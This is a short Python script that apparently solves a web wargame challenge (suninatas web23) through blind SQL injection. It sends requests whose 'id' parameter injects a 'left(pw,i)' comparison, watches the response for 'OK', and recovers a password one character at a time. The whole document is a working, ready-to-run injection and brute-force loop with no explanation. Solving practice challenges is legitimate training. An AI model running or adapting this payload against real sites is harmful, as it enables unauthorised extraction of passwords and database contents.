import requests
pw = "V"

url = "http://suninatas.com/challenge/web23/web23.asp"
for i in range(2,11):
    for j in range(33,128):
        r = requests.get(url,params={"id" : f"'or+left(pw,{i})='{pw+chr(j)}'--", "pw" : "1"})
        if r.text.find("OK") != -1:
            pw += chr(j)
            print(f"password {i} is {chr(j)}")
            break

print(f"password : {pw}")
